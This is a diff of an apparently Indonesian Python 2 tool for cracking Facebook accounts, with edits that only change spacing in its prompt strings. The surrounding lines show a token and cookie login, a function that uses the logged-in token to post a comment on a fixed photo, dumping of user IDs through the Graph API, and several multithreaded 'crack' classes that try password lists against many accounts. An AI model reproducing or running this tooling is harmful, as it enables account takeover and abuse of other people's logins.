@@ -88,7 +88,7 @@ def lang(cookies):
 	if f==True:
 		return True
 	else:
-		exit("   [!]Cookies Mati").format(R,N)
+		exit("[!]Cookies Mati").format(R,N)
 def basecookie():
 	if os.path.exists(".cok"):
 		if os.path.getsize(".cok") !=0:
@@ -124,12 +124,12 @@ def gen():
 		if lang(cks)==True:
 			open(".cok","w").write(ck)
 			convert()
-			print ('   [!] Login Success').format(G,N)
+			print ('[!] Login Success').format(G,N)
 			time.sleep(1)
 			menu()
-		else:print("   [!] Invalid Cookie").format(R,N);gen()
+		else:print("[!] Invalid Cookie").format(R,N);gen()
 	except Exception as e:
-		print("   [!] Error : %s"%e);gen()
+		print("[!] Error : %s"%e);gen()
                 logs()
 def log_token():
 	data = raw_input("[•] Token :")
@@ -138,11 +138,11 @@ def log_token():
 		a = json.loads(me.text)
 		nama = a['name']
 		open("login.txt",'w').write(data)
-		print("   [!] Login Success").format(G,N)
+		print("[!] Login Success").format(G,N)
 		bot_komen()
 		menu()
 	except KeyError:
-		print ("   [!] Invalid Token").format(R,N)
+		print ("[!] Invalid Token").format(R,N)
 		time.sleep(1.0)
 		logs()
 def convert():
@@ -168,14 +168,14 @@ def convert():
 			open("login.txt",'w').write(find_token.group(1))
 			return
 	except Exception as e:
-		print(R+"\n   [•] Error : %s"%e)
+		print(R+"\n[•] Error : %s"%e)
 		exit()
 # bot komen jan di ganti tambahin aja
 def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"   [!] Token invalid"
+		print"[!] Token invalid"
 		logs()
 	una = ('403290050858408')
 	kom = ('https://web.facebook.com/photo?fbid=403290050858408&set=a.101597811027635&type=3&app=fbl')
@@ -194,21 +194,21 @@ def menu():
     nama = a['name']
     id = a['id']
   except Exception as e:
-    print ("   [•] Error : %s"%e).format(R,N)
+    print ("[•] Error : %s"%e).format(R,N)
     time.sleep(1)
     logs()
   os.system("clear")
   banner()
-  print("\033[0;97m[•] Hello : "+nama)
-  print("\033[0;97m[•] UID : "+id)
+  print("\033[0;97m[•] Hello	: "+nama)
+  print("\033[0;97m[•] UID	: "+id)
   print("\033[0;92m───────────────────────────────────────────────")
   print("\033[0;97m[ Pilih Opsi ]")
   print("\033[0;97m[1] Dump ID Public/Friend")
   print("\033[0;97m[2] Crack")
   print("\033[0;97m[0] Logout")
   print("\033[0;92m───────────────────────────────────────────────")
-  r=raw_input("\033[0;97m[•] Input : ")
-  if r=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);menu()
+  r=raw_input("\033[0;97m[•] Input	: ")
+  if r=="":print("\033[0;97m[!] Isi Yang Benar").format(R,N);menu()
   elif r=="1":
     publik()
   elif r=="2":
@@ -219,9 +219,9 @@ def menu():
       os.remove(".cok")
       os.remove("login.txt")
       exit(basecookie())
-    except Exception as e:print("\033[0;97m   [•] Error file tidak ditemukan %s"%e)
+    except Exception as e:print("\033[0;97m[•] Error file tidak ditemukan %s"%e)
   else:
-    print ("   [•] Wrong Input").format(R,N);menu()
+    print ("[•] Wrong Input").format(R,N);menu()
 def publik():
 	try:
 		toket=open('login.txt','r').read()
@@ -235,11 +235,11 @@ def publik():
                 banner()
                 print ("\033[0;92m───────────────────────────────────────────────")
 		print("[•] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
-		idt = raw_input("\033[0;97m[•] User ID Target : ")
+		idt = raw_input("\033[0;97m[•] User ID Target	: ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print("\033[0;97m[•] Name           : "+op["name"])
+			print("\033[0;97m[•] Name	: "+op["name"])
 		except KeyError:
 			print("[!] ID NOT found !").format("R")
 			print("[!] Kembali").format(N)
@@ -259,14 +259,14 @@ def publik():
 		ys.close()
 		print ("\033[0;92m───────────────────────────────────────────────")
 		print ('\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
-		print ("\033[0;97m[•] Total ID : %s"%(len(id)))
-		print ("\033[0;97m[•] Output : %s"%qq)
+		print ("\033[0;97m[•] Total ID	: %s"%(len(id)))
+		print ("\033[0;97m[•] Output	: %s"%qq)
                 print ("\033[0;92m───────────────────────────────────────────────")
-		raw_input("\033[0;97m   [•] [Kembali]")
+		raw_input("\033[0;97m[•] [Kembali]")
 		menu()
 		
 	except Exception as e:
-		exit("[•] Error : %s"%e)
+		exit("[•] Error	: %s"%e)
 def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
@@ -417,7 +417,7 @@ def methode():
   print("\033[0;97m[3] Crack With touch.facebook.com")
   print("\033[0;97m[4] Crack With api")
   print ("\033[0;92m───────────────────────────────────────────────")
-  sek=raw_input("\033[0;97m[•] Input : ")
+  sek=raw_input("\033[0;97m[•] Input	: ")
   if sek=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
   elif sek=="1":
     crack()
@@ -436,9 +436,9 @@ def logs():
   print("\033[0;97m[1] Login With Token")
   print("\033[0;97m[0] Exit")
   print("\033[0;92m───────────────────────────────────────────────")
-  sek=raw_input("\033[0;97m[•] Input : ")
+  sek=raw_input("\033[0;97m[•] Input	: ")
   if sek=="":
-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
+    print("\033[0;97m[!] Isi Yang Benar").format(R,N);logs()
   elif sek=="1":
     log_token()
   elif sek=="2":
@@ -456,7 +456,7 @@ class crack:
 		self.ko=0
 		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih : ")
+			f=raw_input("\033[0;97m[•] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -476,7 +476,7 @@ class crack:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example : pass123,pass12345")
+				print ("\033[0;97m[•] Example	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
@@ -504,7 +504,7 @@ class crack:
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("   [•] Finished")
+				print("[•] Finished")
 				break
 	def pwlist(self):
 		self.pw=raw_input("\033[0;97m[•] Password List : ").split(",")
@@ -557,7 +557,7 @@ class crack1:
 		self.ko=0
 		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih : ")
+			f=raw_input("\033[0;97m[•] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -577,7 +577,7 @@ class crack1:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example : pass123,pass12345")
+				print ("\033[0;97m[•] Example	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
@@ -608,7 +608,7 @@ class crack1:
 				print("[•] Finished")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;92m╚══\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -621,7 +621,7 @@ class crack1:
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("   [•] Finished")
+			print("[•] Finished")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
@@ -658,7 +658,7 @@ class crack2:
 		self.ko=0
 		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih : ")
+			f=raw_input("\033[0;97m[•] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -678,7 +678,7 @@ class crack2:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example : pass123,pass12345")
+				print ("\033[0;97m[•] Example	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
@@ -709,7 +709,7 @@ class crack2:
 				print("[•] Finished")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;92m╚══\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -722,7 +722,7 @@ class crack2:
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("   [•] Finished")
+			print("[•] Finished")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
@@ -759,7 +759,7 @@ class crack2:
 		self.ko=0
 		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih : ")
+			f=raw_input("\033[0;97m[•] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -779,7 +779,7 @@ class crack2:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example : pass123,pass12345")
+				print ("\033[0;97m[•] Example	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
@@ -807,10 +807,10 @@ class crack2:
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("   [•] Finished")
+				print("[•] Finished")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -823,7 +823,7 @@ class crack2:
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("   [•] Finished")
+			print("[•] Finished")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
@@ -860,7 +860,7 @@ class crack3:
 		self.ko=0
 		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih : ")
+			f=raw_input("\033[0;97m[•] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -908,10 +908,10 @@ class crack3:
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("   [•] Finished")
+				print("[•] Finished")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;92m╚══\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -924,7 +924,7 @@ class crack3:
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("   [•] Finished")
+			print("[•] Finished")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
